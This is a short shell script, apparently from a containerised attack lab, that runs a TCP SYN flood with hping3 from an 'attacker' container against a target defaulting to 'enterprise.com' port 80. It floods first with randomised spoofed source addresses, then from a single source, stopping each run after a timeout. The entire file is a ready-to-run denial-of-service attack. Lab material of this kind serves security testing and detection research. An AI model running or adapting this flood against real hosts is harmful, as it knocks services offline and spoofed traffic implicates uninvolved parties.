#!/bin/sh

set -e

# ./dos_syn_flood_hping3.sh clab-virtual-env-attacker
# ./dos_syn_flood_hping3.sh clab-virtual-env-attacker 172.16.30.2 80 120

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "DoS | TCP SYN flood (hping3)"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target] [port] [timeout]"
    exit 1
fi

ATTACKER_CONTAINER="$1"
TARGET="${2:-enterprise.com}"
PORT="${3:-80}"
TIMEOUT="${4:-60}"

echo "================================"
echo "Attack: DoS TCP SYN flood (hping3)"
echo "Target: $TARGET"
echo "Port: $PORT"
echo "Attacker container: $ATTACKER_CONTAINER"
echo "================================"

# -S              -> SYN flag
# -p              -> Target port
# --flood         -> Send packets as fast as possible
# --rand-source   -> Randomize source IP
# --tcp-timestamp -> Set timestamp on packages
# -V              -> Verbose

# docker exec "$ATTACKER_CONTAINER" timeout "$TIMEOUT" hping3 -S -p "$PORT" --flood --rand-source --tcp-timestamp "$TARGET"

# Recommended to kill the process using it's PID and not through a timeout (one reason to avoid exiting the main script)
echo "-----Random Source-----"
docker exec "$ATTACKER_CONTAINER" sh -c "
  hping3 -S -p $PORT --flood --rand-source --tcp-timestamp $TARGET &
  HPING_RND_PID=\$!
  sleep $TIMEOUT
  kill -2 \$HPING_RND_PID
"

echo "-----Same Source-----"
docker exec "$ATTACKER_CONTAINER" sh -c "
  hping3 -S -p $PORT --flood --tcp-timestamp $TARGET &
  HPING_STC_PID=\$!
  sleep $TIMEOUT
  kill -2 \$HPING_STC_PID
"
